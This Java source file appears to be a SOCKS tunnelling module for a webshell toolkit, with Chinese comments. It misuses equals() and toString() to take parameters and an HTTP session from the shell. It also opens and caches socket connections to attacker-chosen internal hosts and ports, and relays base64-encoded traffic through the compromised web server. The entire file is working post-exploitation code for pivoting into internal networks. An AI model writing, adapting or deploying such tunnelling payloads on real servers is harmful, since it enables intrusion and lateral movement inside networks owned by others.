import java.io.ByteArrayOutputStream;
import java.lang.reflect.Method;
import java.net.InetSocketAddress;
import java.nio.ByteBuffer;
import java.nio.channels.SocketChannel;
import java.util.Arrays;
import java.util.Enumeration;
import java.util.HashMap;
import java.util.Map;
import java.util.Random;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;

public class SocksProxy {
    private HashMap parameterMap;
    
    public static String extraData;
    public static Object Session;

    public SocksProxy() {
    }

    public boolean equals(Object paramObject) {
        try {
            this.parameterMap = (HashMap)paramObject;
            this.Session = this.parameterMap.get("httpSession");
            
        } catch (Exception e) {
            return false;
        }
        return true;
    }
    public String toString() {
        this.parameterMap.put("result", this.run().getBytes());
        this.parameterMap = null;
        return null;
    }
    public String run() {
        String methodName = this.get("methodName");
        String socketHash = this.get("socketHash");
        String proxySessionKey = "socks_" + socketHash;
        try {
            if (methodName == null) {
                return "methodName is null";
            }
            if (methodName.equals("createTunnel")) {
                this.createTunnel(proxySessionKey);
                return "ok";
            } else if (methodName.equals("doRead")) {
                byte[] data = this.doRead(proxySessionKey);
                return "ok" + base64encode(data);
            } else if (methodName.equals("doWrite")) {
                this.doWrite(proxySessionKey);
                return "ok";
            } else if (methodName.equals("doClear")) {
                this.doClear();
                return "ok";
            } else {
                return "error:methodName is not supported";
            }
        } catch (Exception e) {
            return "error:" + e.getMessage();
        }
    }

    public void createTunnel(String proxySessionKey) throws Exception {
        String targetIP = this.get("targetIP");
        String targetPort = this.get("targetPort");
        
        // 基本参数验证
        if (targetIP == null || targetPort == null) {
            throw new Exception("targetIP or targetPort is null");
        }
        
        int port = Integer.parseInt(targetPort);
        if (port <= 0 || port > 65535) {
            throw new Exception("Invalid port number: " + port);
        }
        
        // 首先清理可能存在的旧连接
        SocketChannel oldChannel = (SocketChannel)this.sessionGetAttribute(this.Session, proxySessionKey);
        if (oldChannel != null) {
            try {
                oldChannel.close();
            } catch (Exception e) {
                // 忽略关闭异常
            }
            this.sessionRemoveAttribute(this.Session, proxySessionKey);
        }
         
        SocketChannel socketChannel = SocketChannel.open();
        socketChannel.configureBlocking(true); // 连接时使用阻塞模式
        socketChannel.socket().setSoTimeout(5000); // 5秒超时
        socketChannel.socket().setKeepAlive(true); // 启用心跳检测
        socketChannel.connect(new InetSocketAddress(targetIP, port));
        socketChannel.configureBlocking(false); // 连接后切换为非阻塞模式
        
        // 验证连接是否成功
        if (!socketChannel.isConnected()) {
            socketChannel.close();
            throw new Exception("Failed to connect to " + targetIP + ":" + port);
        }
        
        this.sessionSetAttribute(this.Session, proxySessionKey, socketChannel);
    }

    /**
     * 从指定的SocketChannel中读取数据。
     *
     * @param proxySessionKey Session中存储SocketChannel的键。
     * @return 读取到的字节数组。
     * @throws Exception 如果读取失败或Socket已关闭。
     */
    private byte[] doRead(String proxySessionKey) throws Exception {
        SocketChannel socketChannel = (SocketChannel)this.sessionGetAttribute(this.Session, proxySessionKey);
        if (socketChannel == null) {
            // 如果连接不存在，则重新创建（可能用于兼容某些意外断开的情况）
            this.createTunnel(proxySessionKey);
            socketChannel = (SocketChannel)this.sessionGetAttribute(this.Session, proxySessionKey);
        }
        
        // 检查连接状态，如果已关闭则尝试重新连接
        if (socketChannel.socket().isClosed() || !socketChannel.isConnected()) {
            try {
                socketChannel.close();
                this.sessionRemoveAttribute(this.Session, proxySessionKey);
                
                // 尝试重新创建连接
                this.createTunnel(proxySessionKey);
                socketChannel = (SocketChannel)this.sessionGetAttribute(this.Session, proxySessionKey);
                
                if (socketChannel == null || socketChannel.socket().isClosed()) {
                    throw new Exception("Unable to recreate socket connection for read");
                }
            } catch (Exception e) {
                throw new Exception("Socket reconnection failed: " + e.getMessage());
            }
        }
        
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        try {
            ByteBuffer buf = ByteBuffer.allocate(4096);
            int totalBytesRead = 0;
            
            // 尝试多次读取，处理非阻塞I/O
            for (int attempt = 0; attempt < 10; attempt++) {
                buf.clear();
                int length = socketChannel.read(buf);
                
                if (length > 0) {
                    // 有数据可读
                    byte[] data = Arrays.copyOfRange(buf.array(), 0, length);
                    bos.write(data);
                    totalBytesRead += length;
                    
                    // 继续读取剩余数据
                    while (true) {
                        buf.clear();
                        int moreLength = socketChannel.read(buf);
                        if (moreLength > 0) {
                            byte[] moreData = Arrays.copyOfRange(buf.array(), 0, moreLength);
                            bos.write(moreData);
                            totalBytesRead += moreLength;
                        } else if (moreLength == 0) {
                            // 没有更多数据，跳出内层循环
                            break;
                        } else {
                            // moreLength == -1，连接被对端关闭
                            // 但已经读取到了数据，返回已读数据而不是抛出异常
                            if (totalBytesRead > 0) {
                                // 标记连接已关闭，但不立即清理，让下次调用时重新连接
                                return bos.toByteArray();
                            } else {
                                socketChannel.close();
                                this.sessionRemoveAttribute(this.Session, proxySessionKey);
                                throw new Exception("socketChannel closed by peer");
                            }
                        }
                    }
                    // 读取到数据后立即返回
                    break;
                    
                } else if (length == 0) {
                    // 非阻塞模式下暂时没有数据，稍等后重试
                    try {
                        Thread.sleep(10); // 等待10ms
                    } catch (InterruptedException e) {
                        Thread.currentThread().interrupt();
                        break;
                    }
                    
                } else {
                    // length == -1，连接被对端关闭
                    if (totalBytesRead > 0) {
                        // 如果已经读取到数据，返回数据而不是抛出异常
                        break;
                    } else {
                        // 没有读取到任何数据且连接关闭
                        socketChannel.close();
                        this.sessionRemoveAttribute(this.Session, proxySessionKey);
                        throw new Exception("socketChannel closed by peer");
                    }
                }
            }
            
            return bos.toByteArray();
            
        } finally {
            try {
                bos.close();
            } catch (Exception e) {
                // 忽略关闭异常
            }
        }
    }
    
    /**
     * 向指定的SocketChannel中写入数据。
     *
     * @param proxySessionKey Session中存储SocketChannel的键。
     * @throws Exception 如果写入失败。
     */
    private void doWrite(String proxySessionKey) throws Exception {
        this.extraData = this.get("extraData");
        SocketChannel socketChannel = (SocketChannel)this.sessionGetAttribute(this.Session, proxySessionKey);
        
        // 如果连接不存在，尝试重新创建
        if (socketChannel == null) {
            String targetIP = this.get("targetIP");
            String targetPort = this.get("targetPort");
            
            if (targetIP != null && targetPort != null) {
                this.createTunnel(proxySessionKey);
                socketChannel = (SocketChannel)this.sessionGetAttribute(this.Session, proxySessionKey);
                
                if (socketChannel == null) {
                    throw new Exception("Unable to recreate socket connection for doWrite: " + proxySessionKey);
                }
            } else {
                throw new Exception("Socket connection not found for doWrite and cannot recreate: " + proxySessionKey);
            }
        }
        
        byte[] extraDataByte = this.base64decode(extraData); // 将传入的数据进行Base64解码
        ByteBuffer buf = ByteBuffer.allocate(extraDataByte.length);
        buf.clear();
        buf.put(extraDataByte);
        buf.flip();
        while (buf.hasRemaining()) {
            socketChannel.write(buf); // 将数据写入SocketChannel
        }
        buf.clear();
    }

    /**
     * 清理Session中所有由该代理创建的Socket连接。
     */
    private void doClear() {
        Enumeration keys2 = this.sessionGetAttributeNames(this.Session);
        while (keys2.hasMoreElements()) {
            String proxySessionKey = keys2.nextElement().toString();
            if (!proxySessionKey.startsWith("socks_")) continue; // 通过前缀 "socks_" 判断是否为代理连接
            SocketChannel socketChannel = (SocketChannel)this.sessionGetAttribute(this.Session, proxySessionKey);
            try {
                socketChannel.close(); // 关闭Socket
            }
            catch (Exception exception) {
                // empty catch block
            }
            this.sessionRemoveAttribute(this.Session, proxySessionKey); // 从Session中移除
        }
    }
    
    public String get(String key) {
        Object value = this.parameterMap.get(key);
        if (value == null) {
            return null;
        }
        if (value instanceof String) {
            return (String) value;
        }
        if (value instanceof byte[]) {
            try {
                return new String((byte[]) value, "UTF-8");
            } catch (Exception e) {
                return null;
            }
        }
        return value.toString();
    }   

   /**
     * 通过反射调用Session的getAttribute方法。
     *
     * @param session Session对象。
     * @param key 属性名。
     * @return 属性值。
     */
    private Object sessionGetAttribute(Object session, String key) {
        Object result = null;
        try {
            result = session.getClass().getMethod("getAttribute", String.class).invoke(session, key);
        }
        catch (Exception exception) {
            // empty catch block
        }
        return result;
    }

    /**
     * 通过反射调用Session的removeAttribute方法。
     *
     * @param session Session对象。
     * @param key 属性名。
     */
    private void sessionRemoveAttribute(Object session, String key) {
        try {
            session.getClass().getMethod("removeAttribute", String.class).invoke(session, key);
        }
        catch (Exception e) {
            e.printStackTrace();
        }
    }

    /**
     * 通过反射调用Session的getAttributeNames方法。
     *
     * @param session Session对象。
     * @return 属性名枚举。
     */
    private Enumeration sessionGetAttributeNames(Object session) {
        Enumeration result = null;
        try {
            result = (Enumeration)session.getClass().getMethod("getAttributeNames", new Class[0]).invoke(session, new Object[0]);
        }
        catch (Exception exception) {
            // empty catch block
        }
        return result;
    }

    /**
     * 通过反射调用Session的setAttribute方法。
     *
     * @param session Session对象。
     * @param key 属性名。
     * @param value 属性值。
     */
    private void sessionSetAttribute(Object session, String key, Object value) {
        try {
            session.getClass().getMethod("setAttribute", String.class, Object.class).invoke(session, key, value);
        }
        catch (Exception exception) {
            // empty catch block
        }
    }

    /**
     * Base64解码。
     * 为了兼容不同版本的JDK（1.9前后），使用反射动态选择Base64解码实现。
     *
     * @param text 待解码的Base64字符串。
     * @return 解码后的字节数组。
     * @throws Exception 如果解码失败。
     */
    private byte[] base64decode(String text) throws Exception {
        String version2 = System.getProperty("java.version");
        byte[] result = null;
        try {
            if (version2.compareTo("1.8") >= 0) {
                // JDK 1.9及以上版本，使用 java.util.Base64
                this.getClass();
                Class<?> Base642 = Class.forName("java.util.Base64");
                Object Decoder2 = Base642.getMethod("getDecoder", null).invoke(Base642, null);
                result = (byte[])Decoder2.getClass().getMethod("decode", String.class).invoke(Decoder2, text);
            } else {
                // 旧版本，使用 sun.misc.BASE64Decoder
                this.getClass();
                Class<?> Base643 = Class.forName("sun.misc.BASE64Decoder");
                Object Decoder3 = Base643.newInstance();
                result = (byte[])Decoder3.getClass().getMethod("decodeBuffer", String.class).invoke(Decoder3, text);
            }
        }
        catch (Exception exception) {
            // empty catch block
        }
        return result;
    }

    /**
     * Base64编码。
     * 同样兼容不同版本的JDK。
     *
     * @param content 待编码的字节数组。
     * @return Base64编码后的字符串。
     * @throws Exception 如果编码失败。
     */
    private static String base64encode(byte[] content) throws Exception {
        String result = "";
        String version2 = System.getProperty("java.version");
        if (version2.compareTo("1.8") >= 0) {
            Class<?> Base642 = Class.forName("java.util.Base64");
            Object Encoder2 = Base642.getMethod("getEncoder", null).invoke(Base642, null);
            result = (String)Encoder2.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder2, new Object[]{content});
        } else {
            Class<?> Base643 = Class.forName("sun.misc.BASE64Encoder");
            Object Encoder3 = Base643.newInstance();
            result = (String)Encoder3.getClass().getMethod("encode", byte[].class).invoke(Encoder3, new Object[]{content});
            result = result.replace("\n", "").replace("\r", "");
        }
        return result;
    }
}
